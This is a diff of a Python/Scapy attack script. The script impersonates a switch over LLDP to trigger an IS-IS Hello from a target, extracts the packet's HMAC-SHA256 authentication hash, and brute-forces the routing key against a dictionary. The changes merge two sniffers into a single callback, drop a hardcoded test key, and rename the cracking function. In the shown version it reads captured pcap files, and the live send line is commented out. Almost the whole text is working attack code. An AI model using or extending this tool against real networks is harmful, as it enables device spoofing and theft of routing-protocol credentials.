@@ -19,7 +19,7 @@ HASH_LEN = 32 #L, in bytes, 32 for sha-256. L is the length of the hash, measure
 OPAD = b"\x5c" * BLOCK_SIZE
 IPAD = b"\x36" * BLOCK_SIZE
 APAD = bytes.fromhex("878FE1F3") * (HASH_LEN // 4)  # to be repeated HASH_LEN/4 times = 8 times
-KEY="toto" 
+
 # If auth.length = 17 then it's md5 ()
 # If auth.length = 35 then it's sha-256 ()
 # Type is always 10 (0a), then length, then hash function (03 for sha256, 54 (36) for md5)
@@ -122,22 +122,17 @@ def send_lldp(packet: Packet):
     wrpcap(filename="Wireshark_captures/output_lldp.pcapng",pkt=pkt_to_send)
     #sendp(pkt_to_send, iface=IFACE, count=10, inter=1)
 
-# Derive received ISIS packet and send it back
-def send_isis(packet: Packet):
-    wrpcap(filename="Wireshark_captures/output_isis.pcapng",pkt=isis_to_send)
-    return
-
 # Compute Ko, First-Hash and Second-Hash
-# "Ko is always L octets long" so here Ko is alway HASH_LEN octets long.
-# First-Hash = H(Ko XOR Ipad || (IS-IS PDU))
-# Second-Hash = H(Ko XOR Opad || First-Hash)
 def get_hash(key: bytes, isis_apad: bytes) -> bytes:
+    # "Ko is always L octets long" so here Ko is alway HASH_LEN octets long.
+    # First-Hash = H(Ko XOR Ipad || (IS-IS PDU))
+    # Second-Hash = H(Ko XOR Opad || First-Hash)
     if len(key) > HASH_LEN:
         key = sha256(key).digest()
     return hmac.new(key, isis_apad, sha256).digest()
 
 # Extract received hash and compare with computed hashes from dictionnary list
-def find_key(packet: Packet):
+def find_isis_key(packet: Packet):
     #print(packet[0].original.hex())
     t_password = packet[0].getlayer(ISIS_AuthenticationTlv).password
     t_hash = t_password[2:] # Remove 2 first bytes matching the keyID in sha-2
@@ -169,41 +164,46 @@ def find_key(packet: Packet):
             if t_hash == d_hash:
                 f_key = key;
                 break;
-    if f_key:
-        print("Key found: ", f_key.decode())
-        return f_key
-    else:
-        print("Key not found, try another dictionnary.")
-        return 1
+    return f_key
 
 # Do you really need to describe main ?
 def main():
-    # Start ISIS sniffer first in async mode, then start LLDP, so ISIS sniffer is already listening when LLDP triggers auto-sense.
-    # Filter on ISIS Header and exclude your own MAC as source so you don't stop when you sniff your own packet.
+    # A single sniffer to capture both LLDP and ISIS
+    # On the first LLDP from the target, impersonate a switch and send a LLDP packet to trigger the ISIS Hello;
+    # On the ISIS Hello from the target, dissect the packet and bruteforce the key.
     start_time = time.time()
-    isis_sniffer = AsyncSniffer(offline="Wireshark_captures/ISIS-21yHFT1Uy0qiM.pcapng", \
-        lfilter=lambda p: p.haslayer(ISIS_CommonHdr) and p.src != MY_MAC, \
-        count=1)
-    isis_sniffer.start()
+    state = {}
 
-    # Start LLDP sniffer, filter on LLDP, stop asa you receive one
-    lldp_sniffer = AsyncSniffer(offline="Wireshark_captures/ISIS-21yHFT1Uy0qiM.pcapng", \
-        filter="ether proto 0x88cc", \
-        count=1)
-    lldp_sniffer.start()
-    lldp_sniffer.join(timeout=10) # If none is received during 10s, assume error
+    def handle(pkt):
+        # LLDP from the target -> impersonate a switch to trigger the ISIS Hello.
+        # Keep received state in state to only trigger the send_lldp() once
+        if pkt.haslayer(LLDPDU) and not state.get("lldp_sent"):
+            state["lldp_sent"] = True
+            send_lldp(pkt)
+        # ISIS Hello back from the target
+        elif pkt.haslayer(ISIS_CommonHdr):
+            state["isis"] = pkt
 
-    # Impersonate a switch through LLDP to trigger ISIS Hello 
-    send_lldp(lldp_sniffer.results[0])
-    
-    # Assume here for now that the LLDP packet is sent, and the target switch has answered with a ISIS Hello packet.
-    # Proceed with ISIS key bruteforce.
-    isis_sniffer.join(timeout=10) # If none is received during 10s, assume error
-    isis_pkt = isis_sniffer.results[0]
-    #isis_pkt.show()
+    # keep only LLDP and ISIS; ignore our own frame; stop as soon as ISIS is caught.
+    sniff(
+        offline="Wireshark_captures/ISIS-89139121961zyf.pcapng",
+        lfilter=lambda p: p.src != MY_MAC
+            and (p.haslayer(LLDPDU) or p.haslayer(ISIS_CommonHdr)),
+        prn=handle,
+        stop_filter=lambda p: "isis" in state,
+        timeout=10,  # timeout if no ISIS Hello is received within 10s
+    )
 
-    f_key = find_key(isis_pkt)
-    #send_isis(isis_pkt, f_key)
+    if "isis" not in state:
+        print("No ISIS Hello captured within timeout.")
+        return
+
+    f_key = find_isis_key(state["isis"])
+    if f_key:
+        print("Key found: ", f_key.decode())
+    else:
+        print("Key not found, try another dictionnary.")
+
     print("--- %s seconds ---" % (time.time() - start_time))
 
 if __name__ == "__main__":
